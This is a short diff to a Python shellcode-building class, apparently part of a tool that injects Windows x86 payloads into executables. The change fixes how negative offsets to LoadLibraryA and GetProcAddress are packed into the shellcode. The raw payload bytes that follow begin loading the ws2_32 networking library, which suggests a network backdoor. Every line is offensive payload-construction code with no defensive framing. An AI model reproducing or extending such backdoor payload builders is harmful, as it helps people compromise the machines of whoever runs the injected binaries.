@@ -545,10 +545,16 @@ class winI32_shellcode():
 
         self.shellcode1 = "\xfc"   # CLD
         self.shellcode1 += "\xbb"           # mov value below to EBX
-        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
         self.shellcode1 += "\x01\xD3"  # add EBX + EDX
         self.shellcode1 += "\xb9"  # mov value below to ECX
-        self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
         self.shellcode1 += "\x01\xD1"  # add ECX + EDX
 
         self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
